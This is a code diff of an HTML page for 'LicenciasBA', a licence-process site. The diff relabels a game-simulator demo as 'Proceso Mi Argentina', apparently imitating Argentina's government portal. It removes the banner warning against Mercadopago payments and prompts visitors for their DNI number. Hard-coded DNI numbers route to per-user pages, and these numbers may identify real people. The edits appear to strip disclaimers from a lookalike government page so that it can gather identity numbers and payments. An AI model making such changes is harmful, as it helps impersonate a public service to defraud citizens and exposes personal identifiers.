@@ -35,7 +35,7 @@
                     <img class="logo" src="images/licencias22.png" alt="Logo de la demo LicenciasBA">
                     <div>
                         <h1 class="site-title">LICENCIAS<span style="font-weight:800;color:#0a6f6f">BA</span></h1>
-                        <p style="margin:2px 0 0;color:#666;font-size:13px">Simulador de juego</p>
+                        <p style="margin:2px 0 0;color:#666;font-size:13px">Proceso Mi Argentina</p>
                     </div>
                 </div>
                 <a href="index.html" class="back-btn">VOLVER</a>
@@ -44,13 +44,13 @@
     </header>
 
     <main class="page2-container">
-        <div class="demo-banner">No use Mercadopago para este pago que va a realizar
+        <div class="demo-banner">.
         <section class="process-card">
             <h2>Finalizar proceso en trámite</h2>
-            <p>Ingresá el número para continuar.</p>
+            <p>Ingresá tu documento dni para continuar.</p>
             <form id="demo-form">
-                <label for="numero">Número de documento DNI
-                <input id="numero" name="numero" inputmode="numeric" autocomplete="off" required>
+                <label for="numero">Documento DNI
+                <input id="numero" name="numero" placeholder="ingrese su dni" autocomplete="off" required>
                 <p id="error-message" class="error-message" role="alert"></p>
                 <button type="submit" class="next-button">CONTINUAR</button>
             </form>
@@ -63,11 +63,17 @@
             event.preventDefault();
             const number = document.getElementById('numero').value.trim();
             const error = document.getElementById('error-message');
-            if (number !== '31786813') {
+            const demoPages = {
+                '42904977': 'usuario_42904977.html',
+                '44217116': 'usuario_44217116.html',
+                'DEMO-42904977': 'usuario_42904977.html',
+                'DEMO-44217116': 'usuario_44217116.html'
+            };
+            if (!demoPages[number]) {
                 error.textContent = 'El número ingresado no es válido.';
                 return;
             }
-            window.location.href = 'usuario_96244443.html';
+            window.location.href = demoPages[number];
         });
     </script>
 </body>
